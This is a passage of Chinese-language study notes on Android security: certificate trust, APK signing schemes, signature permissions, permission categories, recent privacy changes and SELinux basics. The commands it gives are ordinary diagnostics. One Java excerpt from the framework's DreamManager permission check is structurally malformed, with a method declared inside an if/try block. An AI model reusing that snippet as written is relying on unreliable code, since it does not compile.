title=\"移动平台中的主流签名作用：自签名的完整性鉴别\"></a>移动平台中的主流签名作用：自签名的完整性鉴别</h2><ul>\n<li>什么是自签名<br>证书是用来证明公钥拥有者的身份信息，一般由可信的第三方机构颁发，三方机构用自己的私钥签名拥有者的公钥，从而证明该证书的有效性<br>证书的签名一般是由证书的颁发者的私钥签名<br>自签名指证书的签名者（机构）和证书拥有者（个体）是同一个实体<br>自签名即我自己的私钥签名我自己的公钥</li>\n<li>自签名的作用1：作为信任链的根证书<br>比如一个银行的公钥证书，由银行自己签名，银行自己颁发给自己，访问网上银行服务时，需要吧银行的根证书加入到系统中，从而信任该证书</li>\n<li>自签名的作用2：完整性鉴别 </li>\n</ul>\n<h2 id=\"移动平台中的主流签名作用：信任模式\"><a href=\"#移动平台中的主流签名作用：信任模式\" class=\"headerlink\" title=\"移动平台中的主流签名作用：信任模式\"></a>移动平台中的主流签名作用：信任模式</h2><ul>\n<li><p>何为可信任？<br>我写的应用？<br>我信任的哥们写的应用？</p>\n</li>\n<li><p>如何鉴别可信任<br>签名了？<br>签名是可信的？（证书、证书回溯）</p>\n</li>\n<li><p>可信任和普通应用的权利差异<br>人为的把一些Operation归类<br>某类Operation对于可信任应用和普通应用的表现不一样</p>\n</li>\n<li><p>一些例子<br>系统应用使用系统特权不需要用户弹窗授权</p>\n<h2 id=\"移动平台中的主流签名作用：限制安装-运行\"><a href=\"#移动平台中的主流签名作用：限制安装-运行\" class=\"headerlink\" title=\"移动平台中的主流签名作用：限制安装/运行\"></a>移动平台中的主流签名作用：限制安装/运行</h2></li>\n<li><p>应用安装时<br>是否包含签名？—-》没有？禁止安装<br>提取证书进行验证—-》证书是有效且可信的？—-》不是？禁止安装<br>基于证书的公钥对签名进行验证—-》签名验证通过？—-》不是？禁止安装</p>\n</li>\n<li><p>应用运行某些特殊代码（特权）时<br>是否包含签名？—-》没有？禁止运行<br>提取证书进行验证—-》证书是有效且可信的？—-》不是？禁止运行<br>基于证书的公钥对签名进行验证—-》签名验证通过？—-》不是？禁止运行</p>\n<h2 id=\"权限的作用：细粒度的特权管理\"><a href=\"#权限的作用：细粒度的特权管理\" class=\"headerlink\" title=\"权限的作用：细粒度的特权管理\"></a>权限的作用：细粒度的特权管理</h2></li>\n<li><p>权限是一个ID或者一个字符串</p>\n</li>\n<li><p>权限用来细分权利（类似Capability）</p>\n</li>\n<li><p>通常一个权限与一类操作绑定</p>\n</li>\n<li><p>权限首先需要申请</p>\n</li>\n<li><p>但是申请后是否被批准由平台策略决定</p>\n</li>\n<li><p>例子1：应用读写SDCARD</p>\n</li>\n<li><p>例子2：应用reset手机</p>\n<h2 id=\"权限的安全性保护：通过签名\"><a href=\"#权限的安全性保护：通过签名\" class=\"headerlink\" title=\"权限的安全性保护：通过签名\"></a>权限的安全性保护：通过签名</h2></li>\n<li><p>权限的完整性保护：防篡改<br>例子（通过认证并获得签名后再加policy权限）<br>实现方式：签名对（code+权限）完整性保护 ，如果权限被篡改，签名校验失败，拒绝执行</p>\n</li>\n<li><p>权限的授权安全策略：防Escalate<br>例子（普通应用申请Inject Event权限）<br>实现方式，即使用户申请了，也不能获得，因为签名不是系统的签名，所以不授予权限</p>\n</li>\n</ul>\n<h2 id=\"回顾和总结\"><a href=\"#回顾和总结\" class=\"headerlink\" title=\"回顾和总结\"></a>回顾和总结</h2><h1 id=\"Android中的签名\"><a href=\"#Android中的签名\" class=\"headerlink\" title=\"Android中的签名\"></a>Android中的签名</h1><h2 id=\"Android的签名作用：完整性鉴别\"><a href=\"#Android的签名作用：完整性鉴别\" class=\"headerlink\" title=\"Android的签名作用：完整性鉴别\"></a>Android的签名作用：完整性鉴别</h2><ul>\n<li>支持自签名用于完整行鉴别</li>\n<li>不做信任模式</li>\n<li>不做安装和运行时的限制,即不限制证书是否是可信的<h2 id=\"Android的签名作用：Signature-Permissions-和-ShareUID\"><a href=\"#Android的签名作用：Signature-Permissions-和-ShareUID\" class=\"headerlink\" title=\"Android的签名作用：Signature Permissions 和 ShareUID\"></a>Android的签名作用：Signature Permissions 和 ShareUID</h2></li>\n<li>Signature Protected Level Permissions<br>用于特权Permission<br>只有特定签名的APK才被授权<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!-- @SystemApi Allows access to hardware peripherals.  Intended only for hardware testing.</span></span><br><span class=\"line\"><span class=\"comment\">     &lt;p&gt;Not for use by third-party applications.</span></span><br><span class=\"line\"><span class=\"comment\">     @hide</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.HARDWARE_TEST&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;signature&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>Share Process UID android:sharedUserId=”xxxx”<br>Process间Share UID的目的是共享资源等<br>Android中两个APK Share相同的UID必须其签名所用的Private Key一样（为什么）<br>如果shareUID相同，A可以访问B中的data/data下的资源<br>android11 shareUID不再支持，因为它破坏了应用沙盒的安全模型，使得应用间的隔离变得复杂。<h2 id=\"Android的签名作用：身份ID和升级的匹配\"><a href=\"#Android的签名作用：身份ID和升级的匹配\" class=\"headerlink\" title=\"Android的签名作用：身份ID和升级的匹配\"></a>Android的签名作用：身份ID和升级的匹配</h2></li>\n<li>Android中的自签名只是代表了身份，但不代表身份是否可信任</li>\n<li>Android的应用的Identifier是Package Name:<br>Package Name 不一样，互相不影响，允许同时存在（安装）<br>Package Name 一样，只能存在一个，允许做升级处理</li>\n<li>升级的安全性考虑<br>必须签名的证书一致（防假冒，防侵入隐私）<br>如果不一致，则用户要么放弃新的应用，要么先卸载旧的，再安装新的。但这属于安装，不属于升级<br>正常的升级不擦除应用的工作目录数据，以保证历史数据的持续性<h2 id=\"AndroidAPK之META-INF\"><a href=\"#AndroidAPK之META-INF\" class=\"headerlink\" title=\"AndroidAPK之META INF\"></a>AndroidAPK之META INF</h2></li>\n<li>APK结构</li>\n<li>META INF的组成</li>\n<li>•    Android 7.0 (Nougat) 开始支持 v2 签名（APK Signature Scheme v2），之后又有 v3/v4。<br>  •    使用 v2/v3/v4 签名时，可以不再包含 CERT.RSA、CERT.SF、MANIFEST.MF 文件，因为签名数据存储在 APK 尾部的 Signing Block 里。</li>\n<li><em>APK Signature Scheme 现状（2025）</em>*</li>\n<li><strong>v1（JAR 签名）</strong>：只保护单个条目；Android 7.0+ 仍支持但已不推荐，易被 zipalign 等修改破坏。</li>\n<li><strong>v2</strong>：签名数据位于 APK <strong>Signing Block</strong>；显著加速安装校验，允许不再包含 <code>CERT.RSA/ CERT.SF/ MANIFEST.MF</code>。</li>\n<li><strong>v3</strong>：在 v2 基础上支持<strong>密钥轮换（Proof-of-rotation）</strong>；升级时可更换签名密钥并建立信任链。</li>\n<li><strong>v4</strong>：为<strong>增量安装/分发</strong>设计，搭配 v2/v3 使用，主要由安装器消费。</li>\n<li>校验命令：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apksigner verify -v --print-certs your.apk</span><br></pre></td></tr></table></figure></li>\n<li>Play 商店上架要求：应使用 v2+（新应用一般要求 v3），仅 v1 可能被拒。</li>\n<li>签名流程<br>PrivateKey(hash(CERT.SF)) =&gt; CERT.RSA<h2 id=\"回顾和总结-1\"><a href=\"#回顾和总结-1\" class=\"headerlink\" title=\"回顾和总结\"></a>回顾和总结</h2></li>\n</ul>\n<h1 id=\"Android中的权限\"><a href=\"#Android中的权限\" class=\"headerlink\" title=\"Android中的权限\"></a>Android中的权限</h1><h2 id=\"近年权限与隐私重大变化（Android-10-15-摘要）\"><a href=\"#近年权限与隐私重大变化（Android-10-15-摘要）\" class=\"headerlink\" title=\"近年权限与隐私重大变化（Android 10~15 摘要）\"></a>近年权限与隐私重大变化（Android 10~15 摘要）</h2><ol>\n<li><strong>分区存储 Scoped Storage</strong>（Android 10/11）</li>\n</ol>\n<ul>\n<li>外部存储访问被沙箱化；<code>READ/WRITE_EXTERNAL_STORAGE</code> 逐步被弱化。</li>\n<li>Android 11 起提供 <strong>MANAGE_EXTERNAL_STORAGE</strong>（极度敏感，仅少量场景允许）。</li>\n<li>媒体访问细分为：<code>READ_MEDIA_IMAGES</code> / <code>READ_MEDIA_VIDEO</code> / <code>READ_MEDIA_AUDIO</code>（Android 13+），以及 <strong>选择性访问</strong> <code>READ_MEDIA_VISUAL_USER_SELECTED</code>（Android 14/15）。</li>\n</ul>\n<ol start=\"2\">\n<li><strong>包可见性（Package Visibility）</strong>（Android 11）</li>\n</ol>\n<ul>\n<li>默认<strong>无法枚举</strong>系统上安装的其他包。</li>\n<li>需要在 <code>AndroidManifest.xml</code> 中声明：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">queries</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.target&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">data</span> <span class=\"attr\">android:scheme</span>=<span class=\"string\">&quot;https&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">queries</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"3\">\n<li><strong>运行时权限拆分与新增</strong></li>\n</ol>\n<ul>\n<li>Android 12：蓝牙权限改为运行时 <code>BLUETOOTH_CONNECT/SCAN/ADVERTISE</code>，并引入 <strong>NEARBY_DEVICES</strong> 场景限制。</li>\n<li>Android 12：位置支持<strong>近似/精确</strong>；用户可仅授予近似位置。</li>\n<li>Android 13：<strong>通知权限</strong> <code>POST_NOTIFICATIONS</code> 改为运行时授权。</li>\n<li>Android 14/15：健康/传感器、后台权限进一步收紧（例如 <code>BODY_SENSORS_BACKGROUND</code> 需额外审查）。</li>\n</ul>\n<ol start=\"4\">\n<li><strong>前台服务（FGS）与后台限制</strong></li>\n</ol>\n<ul>\n<li>Android 12 起要求声明 <strong>前台服务类型</strong>（<code>type=&quot;location|mediaPlayback|connectedDevice|dataSync|camera|microphone|health&quot;</code> 等）。</li>\n<li>Android 14/15 对<strong>后台启动 FGS</strong>、超时与并发数量更严格；建议改用 <strong>WorkManager + 明确的 FGS 类型</strong>。</li>\n</ul>\n<ol start=\"5\">\n<li><strong>精确闹钟</strong></li>\n</ol>\n<ul>\n<li>Android 13 引入 <code>USE_EXACT_ALARM</code>；Android 14/15 对非闹钟类 App 更<strong>严格限制</strong>，需合规理由与设置跳转。</li>\n</ul>\n<ol start=\"6\">\n<li><strong>照片选择器（Photo Picker）</strong>（Android 13+）</li>\n</ol>\n<ul>\n<li>无需存储权限即可让用户选择媒体；优先使用系统 Photo Picker 替代自建文件选择。</li>\n</ul>\n<ol start=\"7\">\n<li><strong>PendingIntent 可变性</strong></li>\n</ol>\n<ul>\n<li>Android 12 要求显式设置 <code>FLAG_IMMUTABLE</code> 或 <code>FLAG_MUTABLE</code>，默认不再安全。</li>\n</ul>\n<ol start=\"8\">\n<li><strong>签名权限与 privapp 权限</strong></li>\n</ol>\n<ul>\n<li>大量历史 <code>signatureOrSystem</code> 权限被收紧为 <code>signature</code>；OEM 侧须通过 <code>privapp-permissions</code> 白名单并配套签名。<h2 id=\"Android的权限作用：细粒度特权管理\"><a href=\"#Android的权限作用：细粒度特权管理\" class=\"headerlink\" title=\"Android的权限作用：细粒度特权管理\"></a>Android的权限作用：细粒度特权管理</h2></li>\n<li>权限与操作关联<br>android不支持隐式申请权限，即使是系统应用，也需要显式申请权限</li>\n<li>应用需要显式申请权限</li>\n<li>用户对权限可知（不可控），<br>现在可控（厂商处理）</li>\n<li>对特权权限单独控制<h2 id=\"Android的不同权限类别\"><a href=\"#Android的不同权限类别\" class=\"headerlink\" title=\"Android的不同权限类别\"></a>Android的不同权限类别</h2>在 Android 中，<strong>权限（Permission）</strong>按作用范围和敏感程度可以分为几个主要类别。下面给为一个体系化梳理：<br>⸻</li>\n</ul>\n<ol>\n<li>普通权限 (Normal Permissions)<br> •    特点：涉及用户隐私风险较小，系统会在安装时自动授予。<br> •    示例：<br> •    INTERNET：访问网络<br> •    ACCESS_NETWORK_STATE：获取网络状态<br> •    SET_WALLPAPER：设置壁纸<br>⸻</li>\n<li>危险权限 (Dangerous Permissions)<br> •    特点：涉及用户隐私或设备安全，必须 运行时动态申请（Android 6.0+）。<br> •    按权限组分类（常见组）：<br> •    日历 (CALENDAR)<br> •    READ_CALENDAR、WRITE_CALENDAR<br> •    相机 (CAMERA)<br> •    CAMERA<br> •    联系人 (CONTACTS)<br> •    READ_CONTACTS、WRITE_CONTACTS、GET_ACCOUNTS<br> •    位置 (LOCATION)<br> •    ACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION<br> •    麦克风 (MICROPHONE)<br> •    RECORD_AUDIO<br> •    电话 (PHONE)<br> •    READ_PHONE_STATE、CALL_PHONE、READ_CALL_LOG、WRITE_CALL_LOG、ADD_VOICEMAIL、USE_SIP、PROCESS_OUTGOING_CALLS<br> •    传感器 (SENSORS)<br> •    BODY_SENSORS<br> •    短信 (SMS)<br> •    SEND_SMS、RECEIVE_SMS、READ_SMS、RECEIVE_WAP_PUSH、RECEIVE_MMS<br> •    存储 (STORAGE)<br> •    READ_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE<br>⸻</li>\n<li>签名权限 (Signature Permissions)<br> •    特点：只有当 请求权限的应用 和 声明权限的应用 使用相同的签名证书时，才能授予。<br> •    应用场景：系统应用间的私有接口调用。<br> •    示例：<br> •    INSTALL_PACKAGES（安装 APK）<br> •    DELETE_PACKAGES（卸载 APK）<br>⸻</li>\n<li>签名或系统权限 (SignatureOrSystem Permissions)<br> •    特点：Android 5.0 以前允许系统预装应用（放在 /system/app）或相同签名应用使用。<br> •    状态：Android 6.0 开始逐渐废弃，很多权限被收紧为 Signature-only。<br> •    示例（老系统才有效）：<br> •    WRITE_SETTINGS<br> •    CHANGE_CONFIGURATION<br>⸻</li>\n<li>特殊权限 (Special Permissions)<br>这些不属于普通危险权限，需要通过 特殊 API 或系统设置界面 授权。<br> •    SYSTEM_ALERT_WINDOW（悬浮窗权限）<br> •    通过 Settings.canDrawOverlays() 检查<br> •    WRITE_SETTINGS（修改系统设置）<br> •    通过 Settings.System.canWrite() 检查<br> •    REQUEST_INSTALL_PACKAGES（允许安装未知来源的 APK）<br> •    Android 8.0 引入<br> •    MANAGE_EXTERNAL_STORAGE（管理所有文件）<br> •    Android 11 引入，替代传统的存储权限<br> •    USE_FULL_SCREEN_INTENT（高优先级通知）<br> •    Android 10 引入<br>⸻</li>\n<li>受限制权限 (Restricted Permissions, Android 10+)<br> •    特点：Google 逐步收紧一些权限的使用，需要 Google 审核/声明特殊用途 才能上架 Play。<br> •    示例：<br> •    READ_SMS、SEND_SMS（敏感通讯权限）<br> •    READ_CALL_LOG、WRITE_CALL_LOG<br> •    ACCESS_BACKGROUND_LOCATION（后台定位权限，Android 10+ 严格限制）<br>⸻<br>✅ 总结：Android 权限主要分为：<br> •    普通权限（自动授予）<br> •    危险权限（需要运行时授权）<br> •    签名/签名或系统权限（系统或签名一致才可用）<br> •    特殊权限（需要通过系统设置授权）<br> •    受限制权限（Google 审核，敏感程度高）<h2 id=\"Android的平台权限定义\"><a href=\"#Android的平台权限定义\" class=\"headerlink\" title=\"Android的平台权限定义\"></a>Android的平台权限定义</h2>定义在AndroidManifest.xml中<br>Android 的权限本质上就是字符串常量，统一定义在 frameworks/base/core/res/AndroidManifest.xml 里。<br>这是系统框架的清单文件，其中包含了所有系统预定义权限，例如：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;dangerous&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:protectionLevel</span>=<span class=\"string\">&quot;dangerous&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n当在Application中 AndroidManifest.xml 里写：<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">uses-permission</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n就使用了这个权限，但是必须动态申请。</li>\n</ol>\n<blockquote>\n<p>提示：从 Android 13 起，媒体读取权限按类型细分；从 Android 11 起，**<code>WRITE_EXTERNAL_STORAGE</code> 基本被废弃**，请改用 <code>MediaStore</code> + 具体媒体权限或 Photo Picker。</p>\n</blockquote>\n<h2 id=\"Android的运行时权限控制方式：通过PM的CheckPermission\"><a href=\"#Android的运行时权限控制方式：通过PM的CheckPermission\" class=\"headerlink\" title=\"Android的运行时权限控制方式：通过PM的CheckPermission\"></a>Android的运行时权限控制方式：通过PM的CheckPermission</h2><ul>\n<li>Android独有的Service（底层平台不具有）</li>\n<li>所以需要在Android本身Framework中控制</li>\n<li>主流的Service一般都是基于Binder IPC或者其他IPC提供服务</li>\n<li>所以在最低层控制（Service所在的service可执行文件 run中）以避免逃逸控制<br>绕开Utility Function直接invoke Remote Service<br>所以要在service run中进行控制</li>\n<li>例子 DayDream<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">startDockOrHome</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  awakenDreams();</span><br><span class=\"line\">  <span class=\"type\">Intent</span> <span class=\"variable\">dock</span> <span class=\"operator\">=</span> createDockIntent();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(dock != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">      mContext.startActivityAsUser(dock,UserHandle.CURRENT);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span>(ActivityNotFoundException e)&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">awakenDreams</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      <span class=\"type\">IDreamManager</span> <span class=\"variable\">dreamManager</span> <span class=\"operator\">=</span> getDreamManager();</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(dreamManager != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">          dreamManager.awaken();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span>(RemoteException e)&#123;</span><br><span class=\"line\">          <span class=\"comment\">//fine,stay asleep then</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> IDreamManager <span class=\"title function_\">getDreamManager</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> IDreamManager.Stub.asInterface(ServiceManager.checkService(DreamService.DREAM_SERVICE));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Override</span> <span class=\"comment\">//Binder call</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">awaken</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  checkPermission(android.Manifest.permission.WRITE_DREAM_STATE);</span><br><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">ident</span> <span class=\"operator\">=</span> Binder.clearCallingIdentity();</span><br><span class=\"line\">  <span class=\"keyword\">try</span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkPermission</span><span class=\"params\">(String permission)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mContext.checkCallingOrSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;Access denied to process: &quot;</span> + Binder.getCallingPid()+<span class=\"string\">&quot;, must have permission &quot;</span> + permission);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<blockquote>\n<p>生产代码建议：在 <strong>Binder 端（服务实现）</strong>做二次校验（<code>checkCallingPermission()</code> / <code>enforceCallingPermission()</code>），避免调用方绕过客户端封装直接发起 IPC。</p>\n</blockquote>\n<h2 id=\"Android的运行是权限控制方式：映射为OS的特定属性\"><a href=\"#Android的运行是权限控制方式：映射为OS的特定属性\" class=\"headerlink\" title=\"Android的运行是权限控制方式：映射为OS的特定属性\"></a>Android的运行是权限控制方式：映射为OS的特定属性</h2><ul>\n<li>非Android特有的Service（底层平台已经提供，如File访问，TCPIP数据首发等）</li>\n<li>多个入口访问：Android API , Java API ,NDK C API ,Shell ,etc</li>\n<li>底层控制准则，会聚口在底层，所以在底层（OS层面）统一控制，这样可以避免逃逸控制</li>\n<li>所以复用OS的一些安全控制特性，比如GID</li>\n<li>所以需要把Android空间的Permission Mapping到OS的GID</li>\n<li>例子：访问SDCard<br>sdcard目录下的文件权限如下所示：<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">外部存储挂载示例（不同设备存在差异）</span></span><br><span class=\"line\">marlin:/ $ ls -l /storage</span><br><span class=\"line\">total 8</span><br><span class=\"line\">drwx--x--x 3 root sdcard_rw 4096 2025-09-01 21:59 emulated</span><br><span class=\"line\">drwxr-xr-x 2 root root        60 1974-12-07 14:35 self</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进程通过所属 GID（如 sdcard_rw / media_rw）与 FUSE/SDCardFS/FS-verity 等层配合受控访问</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"Android的Permission与UID-GID的mapping\"><a href=\"#Android的Permission与UID-GID的mapping\" class=\"headerlink\" title=\"Android的Permission与UID/GID的mapping\"></a>Android的Permission与UID/GID的mapping</h2><h1 id=\"Android-专题补充（2025）\"><a href=\"#Android-专题补充（2025）\" class=\"headerlink\" title=\"Android 专题补充（2025）\"></a>Android 专题补充（2025）</h1><h2 id=\"AID-与多用户-UID-计算\"><a href=\"#AID-与多用户-UID-计算\" class=\"headerlink\" title=\"AID 与多用户 UID 计算\"></a>AID 与多用户 UID 计算</h2><ul>\n<li><code>appId</code> 从 10000 起分配；多用户下 <code>uid = userId * 100000 + appId</code>。</li>\n<li>典型系统 AID：<code>AID_SYSTEM=1000</code>、<code>AID_RADIO=1001</code>、<code>AID_BLUETOOTH=1002</code>、<code>AID_GRAPHICS=1003</code> 等（详见 <code>android_filesystem_config.h</code>）。</li>\n</ul>\n<h2 id=\"SELinux（SEAndroid）要点\"><a href=\"#SELinux（SEAndroid）要点\" class=\"headerlink\" title=\"SELinux（SEAndroid）要点\"></a>SELinux（SEAndroid）要点</h2><ul>\n<li>强制访问控制（MAC）默认 <strong>Enforcing</strong>；检查：<code>getenforce</code>。</li>\n<li>App 进程运行在诸如 <code>u:object_r:app_data_file:s0:cXX,cYY</code>（文件）与 <code>u:r:untrusted_app:s0:cXX,cYY</code>（进程域）之下；越权访问由策略阻断。</li>\n<li>调试常用：<code>adb shell dmesg | grep avc:</code>、<code>adb logcat | grep denied</code> 定位策略拒绝。</li>\n</ul>\n<h2 id=\"调试与自检清单\"><a href=\"#调试与自检清单\" class=\"headerlink\" title=\"调试与自检清单\"></a>调试与自检清单</h2><ul>\n<li>查看进程身份与能力：<code>ps -eo pid,ruid,euid,rgid,egid,user,comm</code>; <code>cat /proc/$PID/status</code>。</li>\n<li>查看签名方案与证书：<code>apksigner verify -v --print-certs your.apk</code>。</li>\n<li>遵循现代权限：优先 Photo Picker / MediaStore；声明 <code>queries</code>；细化 FGS 类型；声明 PendingIntent 可变性；最小权限原则。</li>\n</ul>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>本笔记为安全体系与 Android 平台权限/签名机制速记。<strong>最近一次校对：2025-09（基于 Android 15 / API 35 现状）</strong>。文末与相关章节已补充近年重要变更：APK 签名 v2/v3/v4、分区存储、包可见性、运行时权限调整、前台服务限制、精确闹钟权限等。</p>\n</blockquote>\n<p>扎绳篇：<br>非对称密码 公钥体系<br>证书<br>包含公钥，公钥是利用证书来传递的</p>\n<p>利用签名来保护数字证书本身</p>\n<p>人的信任关系：一个信任人的列表<br>数字时代的信任关系：一个受信任者的证书列表</p>\n<p>人的信任链：孔子-》孔子的徒弟-》孔子的徒弟的徒弟<br>数字时代的信任链：证书链<br>证书签名的不同点：根证书自签名，非根证书父签名<br>证书的限制：<br>    约束<br>    用途<br>    有效期<br>PKI的概念</p>\n<p>基于可信任证书的认证方式被广泛的应用在现代安全领域，比如WIFI，HTTPS<br>在HTTPS中，典型的Client对Server的认证和鉴别基于可信任列表<br>织网篇:</p>\n<h1 id=\"进程和进程边界\"><a href=\"#进程和进程边界\" class=\"headerlink\" title=\"进程和进程边界\"></a>进程和进程边界</h1><h2 id=\"进程和线程\"><a href=\"#进程和线程\" class=\"headerlink\" title=\"进程和线程\"></a>进程和线程</h2><p>可执行文件：不活动就是废物<br>进程：可执行文件的活动表现，一次生命的历练，资源的最小单位<br>线程：CPU(核)的调度单位,并发的执行序列，进程的多管齐下<br>资源和调度</p>\n<h2 id=\"手机操作系统的发展\"><a href=\"#手机操作系统的发展\" class=\"headerlink\" title=\"手机操作系统的发展\"></a>手机操作系统的发展</h2><p>Feature Phone 时代的实时简单的单进程多任务非智能系统<br>Smart Phone 时代的多进程多任务智能系统</p>\n<h2 id=\"进程的地址空间边界\"><a href=\"#进程的地址空间边界\" class=\"headerlink\" title=\"进程的地址空间边界\"></a>进程的地址空间边界</h2><p>每个进程的虚拟地址空间0-4G（32位），每个进程的物理地址空间是独立的</p>\n<h2 id=\"进程边界的安全围栏：Crash的不可扩展性\"><a href=\"#进程边界的安全围栏：Crash的不可扩展性\" class=\"headerlink\" title=\"进程边界的安全围栏：Crash的不可扩展性\"></a>进程边界的安全围栏：Crash的不可扩展性</h2><h2 